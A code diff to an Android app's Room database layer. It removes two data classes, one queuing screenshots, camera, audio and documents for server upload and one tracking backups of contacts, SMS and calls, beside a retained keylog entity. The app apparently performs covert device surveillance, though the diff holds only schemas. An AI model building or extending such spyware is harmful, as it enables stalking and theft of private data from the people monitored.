@@ -190,42 +190,6 @@ data class KeylogEntity(
     val synced: Boolean = false
 )
 
-/**
- * File Entity - Tracks files for upload
- */
-@Entity(tableName = "file_queue", indices = [Index(value = ["status"])])
-data class FileQueueEntity(
-    @PrimaryKey(autoGenerate = true) val id: Long = 0,
-    val filePath: String,
-    val fileName: String,
-    val fileType: String, // screenshot, camera, audio, video, document
-    val fileSize: Long,
-    val mimeType: String?,
-    val md5Hash: String?,
-    val uploadUrl: String?,
-    val status: String = "pending", // pending, uploading, completed, failed
-    val progress: Int = 0,
-    val serverFileId: String?,
-    val createdAt: Long = System.currentTimeMillis(),
-    val uploadedAt: Long?,
-    val synced: Boolean = false
-)
-
-/**
- * Backup Entity - Tracks backup history
- */
-@Entity(tableName = "backups", indices = [Index(value = ["backupType", "createdAt"])])
-data class BackupEntity(
-    @PrimaryKey(autoGenerate = true) val id: Long = 0,
-    val backupType: String, // full, contacts, sms, calls, etc.
-    val filePath: String,
-    val fileName: String,
-    val fileSize: Long,
-    val itemCount: Int,
-    val checksum: String?,
-    val encrypted: Boolean = false,
-    val uploaded: Boolean = false,
-    val serverUrl: String?,
-    val createdAt: Long = System.currentTimeMillis(),
-    val expiresAt: Long?
-)
+// Note: FileQueueEntity and BackupEntity were removed because they had no
+// corresponding DAOs and were not registered in the @Database annotation.
+// Re-add them with proper DAOs and Database registration if needed.
